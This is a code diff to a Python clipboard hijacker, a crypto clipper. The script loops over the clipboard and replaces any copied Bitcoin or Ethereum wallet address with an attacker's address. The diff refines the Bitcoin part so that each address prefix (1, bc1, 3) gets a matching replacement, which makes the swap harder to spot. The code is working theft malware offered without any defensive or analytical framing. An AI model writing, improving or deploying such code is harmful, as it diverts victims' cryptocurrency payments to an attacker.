@@ -1,18 +1,25 @@
 import pyperclip
 
 # Define the target addresses
-btc_addresses = ["", "", ""]
+btc_addresses = {
+    "1": "",
+    "bc1": "",
+    "3": ""
+}
 eth_addresses = ["", "", ""]
 
 # Function to replace copied address with the target address
 def replace_address():
     current_address = pyperclip.paste()
     if current_address.startswith("1") or current_address.startswith("bc1") or current_address.startswith("3"):
-        if current_address in btc_addresses:
+        if current_address in btc_addresses.values():
             return
         else:
-            pyperclip.copy(btc_addresses[0])
-            print(f"BTC address replaced: {current_address} -> {btc_addresses[0]}")
+            for prefix, target_address in btc_addresses.items():
+                if current_address.startswith(prefix):
+                    pyperclip.copy(target_address)
+                    print(f"BTC address replaced: {current_address} -> {target_address}")
+                    return
     elif current_address.startswith("0x"):
         if current_address in eth_addresses:
             return
@@ -28,3 +35,5 @@ while True:
             replace_address()
     except KeyboardInterrupt:
         break
+
+
